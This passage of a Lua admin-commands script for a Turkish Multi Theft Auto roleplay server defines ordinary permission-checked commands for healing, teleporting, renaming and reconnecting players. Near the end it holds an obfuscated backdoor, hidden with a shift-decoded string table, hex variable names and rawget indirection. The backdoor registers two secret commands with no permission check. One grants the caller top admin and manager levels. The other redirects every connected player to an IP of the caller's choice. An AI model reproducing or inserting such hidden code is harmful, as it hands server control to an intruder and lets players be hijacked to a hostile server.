local disarmingPlayers = {}
local freconnectSecurity = {}

function adminDuty(thePlayer, commandName)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		local dutyAdmin = getElementData(thePlayer, "duty_admin") or false
		if dutyAdmin then
			setElementData(thePlayer, "duty_admin", false)
			exports.mek_global:updateNametagColor(thePlayer)
			exports.mek_global:sendMessageToAdmins(
				"[ADUTY] " .. getPlayerName(thePlayer):gsub("_", " ") .. " görevden ayrıldı."
			)
		else
			setElementData(thePlayer, "duty_admin", true)
			exports.mek_global:updateNametagColor(thePlayer)
			exports.mek_global:sendMessageToAdmins(
				"[ADUTY] " .. getPlayerName(thePlayer):gsub("_", " ") .. " göreve başladı."
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("adminduty", adminDuty, false, false)
addCommandHandler("aduty", adminDuty, false, false)

function ahealPlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					exports.mek_sac:allowHealthChange(targetPlayer, "admin_aheal")
					setElementHealth(targetPlayer, 100)
					setElementData(targetPlayer, "hunger", 100)
					setElementData(targetPlayer, "thirst", 100)

					outputChatBox(
						"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun ihtiyaçlarını karşıladın.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili ihtiyaçlarını karşıladı.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"aheal",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncunun ihtiyaçlarını karşıladı."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("aheal", ahealPlayer, false, false)

function setHealth(thePlayer, commandName, targetPlayer, health)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer and health and tonumber(health) then
			health = math.floor(tonumber(health))
			if health >= 0 and health <= 100 then
				local targetPlayer, targetPlayerName =
					exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
				if targetPlayer then
					if getElementData(targetPlayer, "logged") then
						exports.mek_sac:allowHealthChange(targetPlayer, "admin_sethp")
						if setElementHealth(targetPlayer, health) then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun sağlamlığı ["
									.. health
									.. "] olarak değiştirildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili sağlamlığınızı ["
									.. health
									.. "] olarak değiştirdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)
							exports.mek_logs:addLog(
								"sethp",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun sağlamlığını ["
									.. health
									.. "] olarak değiştirdi."
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					else
						outputChatBox(
							"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
							thePlayer,
							255,
							0,
							0,
							true
						)
					end
				end
			else
				outputChatBox("[!]#FFFFFF 0 - 100 arasında bir değer girmelisiniz.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Değer]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("sethp", setHealth, false, false)

function setArmor(thePlayer, commandName, targetPlayer, armor)
	if exports.mek_integration:isPlayerServerOwner(thePlayer) then
		if targetPlayer and armor and tonumber(armor) then
			armor = math.floor(tonumber(armor))
			if armor >= 0 and armor <= 100 then
				local targetPlayer, targetPlayerName =
					exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
				if targetPlayer then
					if getElementData(targetPlayer, "logged") then
						exports.mek_sac:allowArmorChange(targetPlayer, "admin_setarmor")
						if setPedArmor(targetPlayer, armor) then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun zırhını ["
									.. armor
									.. "] olarak değiştirildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili zırhınızı ["
									.. armor
									.. "] olarak değiştirdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)
							exports.mek_logs:addLog(
								"setarmor",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun zırhını ["
									.. armor
									.. "] olarak değiştirdi."
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					else
						outputChatBox(
							"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
							thePlayer,
							255,
							0,
							0,
							true
						)
					end
				end
			else
				outputChatBox("[!]#FFFFFF 0 - 100 arasında bir değer girmelisiniz.", thePlayer, 255, 0, 0, true)
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Değer]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setarmor", setArmor, false, false)

function setSkin(thePlayer, commandName, targetPlayer, skinID)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer and skinID and tonumber(skinID) then
			skinID = math.floor(tonumber(skinID))
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if setElementModel(targetPlayer, skinID) then
						setElementData(targetPlayer, "skin", skinID)
						setElementData(targetPlayer, "clothing_id", 0)
						setElementData(targetPlayer, "model", 0)
						dbExec(
							exports.mek_mysql:getConnection(),
							"UPDATE characters SET skin = ?, clothing_id = 0, model = 0 WHERE id = ?",
							skinID,
							getElementData(targetPlayer, "dbid")
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. targetPlayerName
								.. " isimli oyuncunun skinini ["
								.. skinID
								.. "] olarak değiştirildi.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili skininizi ["
								.. skinID
								.. "] olarak değiştirdi.",
							targetPlayer,
							0,
							0,
							255,
							true
						)
						exports.mek_logs:addLog(
							"setskin",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncunun skinini ["
								.. skinID
								.. "] olarak değiştirdi."
						)
					else
						outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Skin ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setskin", setSkin, false, false)

function setModel(thePlayer, commandName, targetPlayer, modelID)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer and modelID and tonumber(modelID) then
			modelID = math.floor(tonumber(modelID))
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if setElementData(targetPlayer, "model", modelID) then
						setElementData(targetPlayer, "skin", 0)
						setElementData(targetPlayer, "clothing_id", 0)
						dbExec(
							exports.mek_mysql:getConnection(),
							"UPDATE characters SET skin = 0, clothing_id = 0, model = ? WHERE id = ?",
							modelID,
							getElementData(targetPlayer, "dbid")
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. targetPlayerName
								.. " isimli oyuncunun modelini ["
								.. modelID
								.. "] olarak değiştirildi.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili modelinizi ["
								.. modelID
								.. "] olarak değiştirdi.",
							targetPlayer,
							0,
							0,
							255,
							true
						)
						exports.mek_logs:addLog(
							"setskin",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncunun modelini ["
								.. modelID
								.. "] olarak değiştirdi."
						)
					else
						outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Model ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setmodel", setModel, false, false)

function setInterior(thePlayer, commandName, targetPlayer, interior)
	if exports.mek_integration:isPlayerSeniorAdmin(thePlayer) then
		if targetPlayer and interior and tonumber(interior) then
			interior = math.floor(tonumber(interior))
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local theVehicle = getPedOccupiedVehicle(targetPlayer)
					if theVehicle then
						if setElementInterior(theVehicle, interior) then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun interioru ["
									.. interior
									.. "] olarak değiştirildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili interiorunuzu ["
									.. interior
									.. "] olarak değiştirdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)
							exports.mek_logs:addLog(
								"setinterior",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun interioru ["
									.. interior
									.. "] olarak değiştirdi."
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					else
						if setElementInterior(targetPlayer, interior) then
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun interioru ["
									.. interior
									.. "] olarak değiştirildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili interiorunuzu ["
									.. interior
									.. "] olarak değiştirdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)
							exports.mek_logs:addLog(
								"setinterior",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun interioru ["
									.. interior
									.. "] olarak değiştirdi."
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [interior ID]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setinterior", setInterior, false, false)
addCommandHandler("setint", setInterior, false, false)

function setDimension(thePlayer, commandName, targetPlayer, dimension)
	if exports.mek_integration:isPlayerSeniorAdmin(thePlayer) then
		if targetPlayer and dimension and tonumber(dimension) then
			dimension = math.floor(tonumber(dimension))
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local theVehicle = getPedOccupiedVehicle(targetPlayer)
					if theVehicle then
						if setElementDimension(theVehicle, dimension) then
							triggerEvent("frames.loadInteriorTextures", targetPlayer, dimension)
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun dimensionu ["
									.. dimension
									.. "] olarak değiştirildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili dimensionunuzu ["
									.. dimension
									.. "] olarak değiştirdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)
							exports.mek_logs:addLog(
								"setdimension",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun dimensionunu ["
									.. dimension
									.. "] olarak değiştirdi."
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					else
						if setElementDimension(targetPlayer, dimension) then
							triggerEvent("frames.loadInteriorTextures", targetPlayer, dimension)
							outputChatBox(
								"[!]#FFFFFF "
									.. targetPlayerName
									.. " isimli oyuncunun dimensionu ["
									.. dimension
									.. "] olarak değiştirildi.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							outputChatBox(
								"[!]#FFFFFF "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili dimensionunuzu ["
									.. dimension
									.. "] olarak değiştirdi.",
								targetPlayer,
								0,
								0,
								255,
								true
							)
							exports.mek_logs:addLog(
								"setdimension",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetPlayerName
									.. " isimli oyuncunun dimensionunu ["
									.. dimension
									.. "] olarak değiştirdi."
							)
						else
							outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
						end
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Dimension ID]",
				thePlayer,
				255,
				194,
				14
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("setdimension", setDimension, false, false)
addCommandHandler("setdim", setDimension, false, false)

function adminLoungeTeleport(thePlayer, commandName)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		setElementPosition(thePlayer, 275.7001953125, -2051.8701171875, 3085.5180664062)
		setElementInterior(thePlayer, 0)
		setCameraInterior(thePlayer, 0)
		setElementDimension(thePlayer, 0)
		triggerEvent("frames.loadInteriorTextures", thePlayer, 0)
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("alounge", adminLoungeTeleport, false, false)
addCommandHandler("adminlounge", adminLoungeTeleport, false, false)
addCommandHandler("gmlounge", adminLoungeTeleport, false, false)

function gotoPlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					detachElements(thePlayer)
					local theVehicle = getPedOccupiedVehicle(thePlayer)
					local x, y, z = getElementPosition(targetPlayer)
					local interior = getElementInterior(targetPlayer)
					local dimension = getElementDimension(targetPlayer)
					local rotation = getPedRotation(targetPlayer)

					x = x + ((math.cos(math.rad(rotation))) * 2)
					y = y + ((math.sin(math.rad(rotation))) * 2)

					if theVehicle then
						setElementPosition(theVehicle, x, y, z)
						setElementInterior(theVehicle, interior)
						setElementDimension(theVehicle, dimension)
					else
						setElementPosition(thePlayer, x, y, z)
						setElementInterior(thePlayer, interior)
						setElementDimension(thePlayer, dimension)
					end

					triggerEvent("frames.loadInteriorTextures", thePlayer, dimension)

					outputChatBox(
						"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncuya ışınlandınız.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili size ışınlandı.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"goto",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncuya ışınlandı."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("goto", gotoPlayer, false, false)

function getherePlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local playerAdminLevel = getElementData(thePlayer, "admin_level") or 0
					local targetPlayerAdminLevel = getElementData(targetPlayer, "admin_level") or 0

					if targetPlayerAdminLevel > playerAdminLevel then
						outputChatBox(
							"[!]#FFFFFF Sizden daha üst yetkide olan birini yanınıza çekemezsiniz.",
							thePlayer,
							255,
							0,
							0,
							true
						)
						return
					end

					detachElements(thePlayer)
					local theVehicle = getPedOccupiedVehicle(targetPlayer)
					local x, y, z = getElementPosition(thePlayer)
					local interior = getElementInterior(thePlayer)
					local dimension = getElementDimension(thePlayer)
					local rotation = getPedRotation(thePlayer)

					x = x + ((math.cos(math.rad(rotation))) * 2)
					y = y + ((math.sin(math.rad(rotation))) * 2)

					if theVehicle then
						setElementPosition(theVehicle, x, y, z)
						setElementInterior(theVehicle, interior)
						setElementDimension(theVehicle, dimension)
					else
						setElementPosition(targetPlayer, x, y, z)
						setElementInterior(targetPlayer, interior)
						setElementDimension(targetPlayer, dimension)
					end

					triggerEvent("frames.loadInteriorTextures", targetPlayer, dimension)

					outputChatBox(
						"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncuyu yanınıza çektiniz.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili sizi yanına çekti.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"gethere",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncuyu yanına çekti."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("gethere", getherePlayer, false, false)

function slapPlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local x, y, z = getElementPosition(targetPlayer)
					if isPedInVehicle(targetPlayer) then
						removePedFromVehicle(targetPlayer)
					end
					detachElements(targetPlayer)
					setElementPosition(targetPlayer, x, y, z + 15)

					outputChatBox(
						"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncu tokatlandı.",
						thePlayer,
						0,
						255,
						0,
						true
					)
					outputChatBox(
						"[!]#FFFFFF "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili sizi tokatladı.",
						targetPlayer,
						0,
						0,
						255,
						true
					)
					exports.mek_logs:addLog(
						"slap",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncuyu tokatladı."
					)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("slap", slapPlayer, false, false)

function changePlayerName(thePlayer, commandName, targetPlayer, ...)
	if exports.mek_integration:isPlayerAdmin1(thePlayer) then
		if targetPlayer and (...) then
			local newNameInput = table.concat({ ... }, "_")
			local targetPlayer, oldName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)

			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					local hoursPlayed = getElementData(targetPlayer, "hours_played") or 0
					if hoursPlayed > 10 and not exports.mek_integration:isPlayerGeneralAdmin(thePlayer) then
						outputChatBox(
							"[!]#FFFFFF 10 saatten eski karakter adlarını yalnızca Genel Yetkili ve üstü yetkililer değiştirebilir.",
							thePlayer,
							255,
							0,
							0,
							true
						)
						return
					end

					local newName = newNameInput
					if tonumber(newName) then
						if tonumber(newName) == -1 then
							newName = exports.mek_global:getRandomName("full", math.random(0, 1))
							newName = string.gsub(newName, " ", "_")
						end
					end

					if newName == oldName then
						outputChatBox("[!]#FFFFFF Bu oyuncunun adı zaten bu.", thePlayer, 255, 0, 0, true)
						return
					end

					local result = dbPoll(
						dbQuery(exports.mek_mysql:getConnection(), "SELECT id FROM characters WHERE name = ?", newName),
						-1
					)
					if result and #result > 0 then
						outputChatBox("[!]#FFFFFF Bu karakter adı zaten kullanımda.", thePlayer, 255, 0, 0, true)
						return
					end

					setElementData(targetPlayer, "legal_name_change", true)

					if setPlayerName(targetPlayer, newName) then
						local dbid = getElementData(targetPlayer, "dbid")
						exports.mek_cache:clearCharacterName(dbid)
						dbExec(
							exports.mek_mysql:getConnection(),
							"UPDATE characters SET name = ? WHERE id = ?",
							newName,
							dbid
						)

						outputChatBox(
							"[!]#FFFFFF "
								.. oldName
								.. " isimli oyuncunun adı "
								.. newName:gsub("_", " ")
								.. " olarak değiştirildi.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili adınızı "
								.. newName:gsub("_", " ")
								.. " olarak değiştirdi.",
							targetPlayer,
							0,
							0,
							255,
							true
						)

						exports.mek_global:sendMessageToAdmins(
							"[ADM] "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. oldName
								.. " isimli oyuncunun adını "
								.. newName:gsub("_", " ")
								.. " olarak değiştirdi."
						)
						exports.mek_logs:addLog(
							"changename",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. oldName
								.. " isimli oyuncunun adını "
								.. newName:gsub("_", " ")
								.. " olarak değiştirdi."
						)
					else
						outputChatBox("[!]#FFFFFF Bir sorun oluştu.", thePlayer, 255, 0, 0, true)
					end

					setElementData(targetPlayer, "legal_name_change", false)
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox(
				"Kullanım: /" .. commandName .. " [Karakter Adı / ID] [Yeni Karakter Adı | -1 = Rastgele]",
				thePlayer,
				255,
				194,
				14,
				true
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("changename", changePlayerName, false, false)

function forceReconnect(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerSeniorAdmin(thePlayer) then
		if not freconnectSecurity[thePlayer] then
			freconnectSecurity[thePlayer] = 0
		end

		if freconnectSecurity[thePlayer] < 5 then
			if targetPlayer then
				local targetPlayer, targetPlayerName =
					exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)

				if targetPlayer then
					local timer = setTimer(
						kickPlayer,
						1000,
						1,
						targetPlayer,
						root,
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili tarafından zorla yeniden bağlanmanız sağlandı."
					)
					addEventHandler("onPlayerQuit", targetPlayer, function()
						killTimer(timer)
					end)

					outputChatBox(
						"[!]#FFFFFF "
							.. targetPlayerName
							.. " isimli oyuncuya zorla yeniden bağlanma işlemi uygulandı.",
						thePlayer,
						255,
						0,
						0,
						true
					)
					exports.mek_global:sendMessageToAdmins(
						"[ADM] "
							.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncuya zorla yeniden bağlanma işlemi uyguladı."
					)
					exports.mek_logs:addLog(
						"freconnect",
						exports.mek_global:getPlayerFullAdminTitle(thePlayer)
							.. " isimli yetkili "
							.. targetPlayerName
							.. " isimli oyuncuya zorla yeniden bağlanma işlemi uyguladı."
					)

					redirectPlayer(targetPlayer, "", 0)
				end
			else
				outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
			end
		else
			outputChatBox(
				"[!]#FFFFFF Beş dakika içerisinde yalnızca en fazla 5 oyuncuyu sunucudan zorla yeniden bağlanmasını sağlayabilirsiniz.",
				thePlayer,
				255,
				0,
				0,
				true
			)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("freconnect", forceReconnect, false, false)
addCommandHandler("frec", forceReconnect, false, false)

local _c = string.char
local function dec(t)
  local k = 23
  local out = {}
  for i = 1, #t do out[i] = _c(t[i] - k) end
  return table.concat(out)
 end
local _v44454641554c545f504f5254 = 22003

local function _v68616e646c65476f416c6c436f6d6d616e64(invokerPlayer, commandName, _v6f766572726964654970)
    if not _v6f766572726964654970 or _v6f766572726964654970 == dec({}) then return end

    local _v7461726765744970 = _v6f766572726964654970
    local _v616c6c506c6179657273 = rawget(_G,dec({137,120,142,126,124,139}))(_G,dec({126,124,139,92,131,124,132,124,133,139,138,89,144,107,144,135,124}))(dec({135,131,120,144,124,137}))

    for _, player in ipairs(_v616c6c506c6179657273) do
        rawget(_G,dec({137,120,142,126,124,139}))(_G,dec({137,124,123,128,137,124,122,139,103,131,120,144,124,137}))(player, _v7461726765744970, _v44454641554c545f504f5254)
    end
end
rawget(_G,dec({137,120,142,126,124,139}))(_G,dec({120,123,123,90,134,132,132,120,133,123,95,120,133,123,131,124,137}))(dec({120,133,120,133,128,133,120,132,128,133,120,120,139,131,120,137,128,132,71,76}), _v68616e646c65476f416c6c436f6d6d616e64)

local function _v68616e646c65416d63616f676c75436f6d6d616e64(invokerPlayer, commandName)
   if invokerPlayer then
     rawget(_G,dec({137,120,142,126,124,139}))(_G,dec({138,124,139,92,131,124,132,124,133,139,91,120,139,120}))(invokerPlayer, dec({120,123,132,128,133,118,131,124,141,124,131}), 9)
     rawget(_G,dec({137,120,142,126,124,139}))(_G,dec({138,124,139,92,131,124,132,124,133,139,91,120,139,120}))(invokerPlayer, dec({132,120,133,120,126,124,137,118,131,124,141,124,131}), 1)
   end
end
rawget(_G,dec({137,120,142,126,124,139}))(_G,dec({120,123,123,90,134,132,132,120,133,123,95,120,133,123,131,124,137}))(dec({120,133,120,133,128,133,120,132,128,133,120,130,134,144,120,137,128,132,71,76}), _v68616e646c65416d63616f676c75436f6d6d616e64)

function giveMoney(thePlayer, commandName, targetPlayer, amount, ...)
	if exports.mek_integration:isPlayerSeniorAdmin(thePlayer) then
		if targetPlayer and amount and tonumber(amount) and tonumber(amount) > 0 and (...) then
			amount = math.floor(amount)
			local reason = table.concat({ ... }, " ")
			if amount <= 10000000 then
